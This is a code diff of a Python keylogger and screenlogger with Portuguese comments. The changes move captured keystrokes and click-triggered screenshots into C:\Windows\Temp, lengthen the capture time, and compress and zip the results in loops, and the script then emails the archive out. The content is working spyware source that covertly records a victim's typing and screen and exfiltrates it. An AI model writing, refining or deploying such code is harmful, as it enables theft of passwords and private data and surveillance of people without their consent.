@@ -65,7 +65,7 @@ def send_email(email, password, receiver, subject='(no subject)'):
     msg['Subject'] = subject
     msg['To'] = receiver
 
-    with open('log.zip', "rb") as myfile:
+    with open(zip_path, "rb") as myfile:
         file_data = myfile.read()
         file_name = myfile.name
         msg.add_attachment(file_data,
@@ -84,13 +84,13 @@ def on_click(x, y, button, pressed):
 
     if pressed and number_of_clicks < 5:
         number_of_clicks += 1
-        print('click')
         # copy the screen into our memory device context
         mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),
                       win32con.SRCCOPY)
         # # save the bitmap to a file
         screenshot.SaveBitmapFile(
-            mem_dc, 'screenshot' + f'{number_of_clicks}' + '.jpg')
+            mem_dc,
+            folder_path + 'screenshot' + f'{number_of_clicks}' + '.jpg')
 
 
 # grab a handle to the main desktop window
@@ -115,9 +115,11 @@ screenshot.CreateCompatibleBitmap(img_dc, width, height)
 mem_dc.SelectObject(screenshot)
 
 x = False  # Value to if held
-log_path = 'logs.txt'  # Trocar para C:\Windows\Temp\logs.json
+folder_path = "C:\Windows\Temp\\"
+log_path = folder_path + 'logs.txt'  # Trocar para C:\Windows\Temp\logs.json
+zip_path = folder_path + 'folder.zip'
 number_of_clicks = 0
-execution_time = 10
+execution_time = 30
 
 print("[+] Keylogger funcionando com sucesso!")
 print(f"[!] Salvando dados no diretório '{log_path}'")
@@ -133,32 +135,21 @@ with keyboard.Listener(on_press=on_press) as k_listener:
 mem_dc.DeleteDC()
 win32gui.DeleteObject(screenshot.GetHandle())
 
-print("[-] Keylogger e Screenlogger finalizados!")
+print("[-] Keylogger finalizados!")
 
-image_file1 = Image.open('screenshot1.jpg')
-image_file1.save("screenshot1.jpg", quality=65)
-
-image_file2 = Image.open('screenshot2.jpg')
-image_file2.save("screenshot2.jpg", quality=65)
-
-image_file3 = Image.open('screenshot3.jpg')
-image_file3.save("screenshot3.jpg", quality=65)
-
-image_file4 = Image.open('screenshot4.jpg')
-image_file4.save("screenshot4.jpg", quality=65)
-
-image_file5 = Image.open('screenshot5.jpg')
-image_file5.save("screenshot5.jpg", quality=65)
+for n in range(5):
+    image_file = Image.open(folder_path + 'screenshot' + f'{n+1}' + '.jpg')
+    image_file.save(folder_path + 'screenshot' + f'{n+1}' + '.jpg', quality=65)
 
 # create a ZipFile object
-zipObj = ZipFile('log.zip', 'w')
+zipObj = ZipFile(zip_path, 'w')
+
 # Add multiple files to the zip
-zipObj.write('logs.txt')
-zipObj.write('screenshot1.jpg')
-zipObj.write('screenshot2.jpg')
-zipObj.write('screenshot3.jpg')
-zipObj.write('screenshot4.jpg')
-zipObj.write('screenshot5.jpg')
+zipObj.write(log_path)
+
+for n in range(5):
+    zipObj.write(folder_path + 'screenshot' + f'{n+1}' + '.jpg')
+
 # close the Zip File
 zipObj.close()
 
@@ -169,9 +160,3 @@ except:
     print("Couldn't send email")
 else:
     print("Email sent!")
-
-
-# To Do List:
-# - usar for loops para reduzir o código
-# - trocar path de todos os arquivos
-# - talvez usar mais funcões para estruturar o código
